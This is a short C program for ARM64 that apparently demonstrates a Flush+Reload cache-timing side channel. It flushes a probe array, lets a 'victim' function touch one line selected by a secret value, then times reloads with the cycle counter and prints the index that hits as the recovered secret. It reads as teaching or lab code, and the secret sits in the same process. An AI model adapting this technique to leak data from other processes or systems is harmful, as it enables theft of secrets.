#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <inttypes.h>

uint8_t array[256 * 64];
volatile uint8_t temp;
unsigned char secret = 64;
/* cache hit time threshold assumed*/
#define CACHE_HIT_THRESHOLD (130)
#define DELTA 0

static inline uint64_t read_pmccntr(void)
{
  uint64_t val;
  asm volatile("mrs %0, pmccntr_el0" : "=r"(val));
  return val;
}
void victim()
{
  temp = array[secret * 64 + DELTA];
}
void flushSideChannel()
{
  int i;
  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++)
  {
    array[i * 64 + DELTA] = 1;
  }

  // flush the values of the array from cache
  for (i = 0; i < 256; i++)
  {
    asm volatile("dc civac, %0" : : "r"(&array[i * 64 + DELTA]) : "memory");
    asm volatile("dsb ish"); // Data synchronization barrier ensure write has completed
    asm volatile("isb");
  }
}

void reloadSideChannel()
{
  register uint64_t time1, time2, time_diff;
  int temp, temp2;
  int i, j, mix_i;
  for (i = 0; i < 256; i++)
  {
    mix_i = ((i * 167) + 13) & 255;
    asm volatile("isb");
    time1 = read_pmccntr();
    asm volatile("isb");

    temp = array[mix_i * 64 + DELTA];
    asm volatile("dsb ish"); // Data synchronization barrier after volatile access
    asm volatile("isb");

    time2 = read_pmccntr();
    asm volatile("isb"); // Serialize after reading the counter
    time_diff = time2 - time1;

    // printf("~~~~~At mix_i = %d~~~~~\ntime_diff: %d\n\n", mix_i, time_diff);
    if (time_diff <= CACHE_HIT_THRESHOLD)
    {
      printf("array[%d*128 + %d] is in cache.\n", mix_i, DELTA);
      printf("The Secret = %d.\n", mix_i);
      printf("hit time is %d\n",time_diff);
      printf("\n");
    }

    // flush the values of the array from cache

    // for (j = 0; j < 256; j++)
    // {
    //   asm volatile("dc civac, %0" : : "r"(&array[j * 64 + DELTA]) : "memory");
    //   asm volatile("dsb ish"); // Data synchronization barrier ensure write has completed
    //   asm volatile("isb");
    // }

    // victim();
  }
}

int main(int argc, const char **argv)
{
  for (int i = 0; i < 256 * 64; i++)
  {
    array[i] = i;
  }
  flushSideChannel();
  victim();
  reloadSideChannel();
  return (0);
}
